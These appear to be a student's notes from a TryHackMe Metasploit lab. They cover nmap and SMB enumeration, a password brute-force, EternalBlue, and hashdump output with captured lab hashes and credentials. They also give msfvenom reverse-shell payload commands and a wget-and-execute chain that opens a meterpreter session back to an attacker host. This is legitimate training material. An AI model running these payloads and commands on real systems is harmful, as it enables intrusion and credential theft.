Room 2 of Metasploit module
=============================================================================
nmap scan: nmap -A -PN -R 10.10.199.35

Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-22 20:21 EDT
Nmap scan report for 10.10.199.35
Host is up (0.10s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5e
22/tcp   open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 1e:46:06:9b:80:8d:7f:22:fb:70:f3:ad:4f:21:80:f5 (RSA)
|   256 89:9c:e4:ab:12:d3:5d:45:1d:fa:1d:3f:3d:ae:b7:f4 (ECDSA)
|_  256 ff:22:c7:1f:c3:28:68:84:12:e7:87:a9:9b:31:21:d5 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: ACME IT SUPPORT)
445/tcp  open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: ACME IT SUPPORT)
8000/tcp open  http        WebFS httpd 1.21
|_http-server-header: webfs/1.21
|_http-title: Site doesn't have a title (text/plain).
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=6/22%OT=21%CT=1%CU=39637%PV=Y%DS=4%DC=T%G=Y%TM=62B3B22
OS:4%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST1
OS:1NW7%O6=M506ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN
OS:(R=Y%DF=Y%T=40%W=F507%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 4 hops
Service Info: Host: IP-10-10-199-35; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time:
|   date: 2022-06-23T00:21:51
|_  start_date: N/A
|_nbstat: NetBIOS name: IP-10-10-199-35, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: ip-10-10-199-35
|   NetBIOS computer name: IP-10-10-199-35\x00
|   Domain name: eu-west-1.compute.internal
|   FQDN: ip-10-10-199-35.eu-west-1.compute.internal
|_  System time: 2022-06-23T00:21:51+00:00

TRACEROUTE (using port 110/tcp)
HOP RTT      ADDRESS
1   30.87 ms 10.6.0.1
2   ... 3
4   99.67 ms 10.10.199.35

========================================================================

smb enum:

msf6 > search smb enumshare

msf6 > use 0

set RHOSTS 10.10.199.35

msf6 auxiliary(scanner/smb/smb_enumshares) > show options

msf6 auxiliary(scanner/smb/smb_enumshares) > run

[*] 10.10.199.35:139      - Starting module
[*] 10.10.199.35:445      - Starting module
[!] 10.10.199.35:445      - peer_native_os is only available with SMB1 (current version: SMB3)
[!] 10.10.199.35:445      - peer_native_lm is only available with SMB1 (current version: SMB3)
[+] 10.10.199.35:445      - print$ - (DISK) Printer Drivers
[+] 10.10.199.35:445      - IPC$ - (IPC|SPECIAL) IPC Service (ip-10-10-199-35 server (Samba, 1776))
[*] 10.10.199.35:         - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

==========================================================================

msf6 auxiliary(scanner/smb/smb_version) > run

[*] 10.10.224.60:445      - SMB Detected (versions:1, 2, 3) (preferred dialect:SMB 3.1.1) (compression capabilities:) (encryption capabilities:AES-128-CCM) (signatures:optional) (guid:{312d7069-2d30-3031-2d32-32342d363000}) (authentication domain:IP-10-10-224-60)
[*] 10.10.224.60:445      -   Host could not be identified: Windows 6.1 (Samba 4.7.6-Ubuntu)
[*] 10.10.224.60:         - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

============================================================================

msf6 auxiliary(scanner/discovery/udp_sweep) > exploit

[*] Sending 13 probes to 10.10.224.60->10.10.224.60 (1 hosts)
[*] Discovered NetBIOS on 10.10.224.60:137 (IP-10-10-224-60:<00>:U :IP-10-10-224-60:<03>:U :IP-10-10-224-60:<20>:U :__MSBROWSE__:<01>:G :ACME IT SUPPORT:<00>:G :ACME IT SUPPORT:<1d>:U :ACME IT SUPPORT:<1e>:G :00:00:00:00:00:00)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

=========================================================================

msf6 auxiliary(scanner/smb/smb_login) > show options

msf6 auxiliary(scanner/smb/smb_login) > set RHOSTS 10.10.224.60

msf6 auxiliary(scanner/smb/smb_login) > set SMBUSER penny

msf6 auxiliary(scanner/smb/smb_login) > set STOP_ON_SUCCESS true

msf6 auxiliary(scanner/smb/smb_login) > set PASS_FILE /home/phobic/THM/Metasploit/metasploitwordlist.txt

[+] 10.10.224.60:445      - 10.10.224.60:445 - Success: '.\penny:leo1234'

==========================================================================
# Only worked once on local machine (Switched to attackbox after errors)
eternalblue:

search eternal blue

use

set RHOSTS

set LHOST

exploit

WIN!!

find -f flag.txt : c:\Users\Jon\Documents\flag.txt

cd /

pwd

cd /Users/Jon/Documents/

cat flag.txt : THM-5455554845

==========================================================================
Requires familarity w/ mimikatz

NTLM hash for "pirate" password

meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
pirate:1001:aad3b435b51404eeaad3b435b51404ee:8ce9a3ebd1647fcc5e04025019f4b875:::

# UsernameHash:PasswordHash:::
===========================================================================

Task 6: craft msfvenom payload

# Msfvenom replaced Msfpayload & Msfencode
# output formats - msfvenom --list formats
# msfvenom -l payloads
# msfvenom can access all payloads in msf (in all available languages/formats)
# Standalone payload - Windows executable for meterpreter
# Raw format (usable) - python, JS, etc
# -f raw -e php/base64 - f format (raw) -e (encoded)
# Catching (a) shell - receiving rev shell
# Multihandler is used to receive incoming connection - exploit/multi/handler
# Listener used to receieve connections for target machine
# Handler is used to receieve and handle established connection

PHP Reverse shell: msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw > reverse_shell.php
# Generate PHP shell using msfvenom
# Set up handler/listener
# Exec PHP shell
# PHP end tag will be missing (must be added to exec)

Payload examples:

Linux Exec & Linkable format (elf): msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=172.19.26.48 LPORT
=9000 -f elf > rev_shell.elf
# chmod +x to use payload on linux system (./shell.elf)

Windows: msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe

PHP: msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php

ASP: msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp

Python: msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py

Lab: murphy:1q2w3e4r - connect via ssh

# whoami
# sudo su
# create payload (attacker): msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=172.20.219.190 LPORT=1234  -f elf > rev_shell.elf
# Set up python web server: python3 -m http.server 9000
# wget from target machine: http://172.20.219.190:9000/rev_shell.elf
# make rev shell executable: sudo chmod +x rev_shell.elf
# Set up multihandler on msf (attacker): use exploit/multi/handler
# set payload: set payload linux/x86/meterpreter/reverse_tcp
# set LHOST - attackbox IP (attacker) 
# set LPORT 1234 (attacker)
# run handler (attacker): exploit / run
# exec rev shell (target): ./rev_shell.elf
# run hashdump: run post/linux/gather/hashdump

Hashdump:

[+] murphy:$6$qK0Kt4UO$HuCrlOJGbBJb5Av9SL7rEzbxcz/KZYFkMwUqAE0ZMDpNRmOHhPHeI2JU3m9OBOS7lUKkKMADLxCBcywzIxl7b.:1001:1001::/home/murphy:/bin/sh
[+] claire:$6$Sy0NNIXw$SJ27WltHI89hwM5UxqVGiXidj94QFRm2Ynp9p9kxgVbjrmtMez9EqXoDWtcQd8rf0tjc77hBFbWxjGmQCTbep0:1002:1002::/home/claire:/bin/sh
[+] Unshadowed Password File: /root/.msf4/loot/20220727022332_default_10.10.184.155_linux.hashes_063574.txt

### Notes

# After setting up listener check available files - 127.0.0.1:9000 (9000 is set to listener)
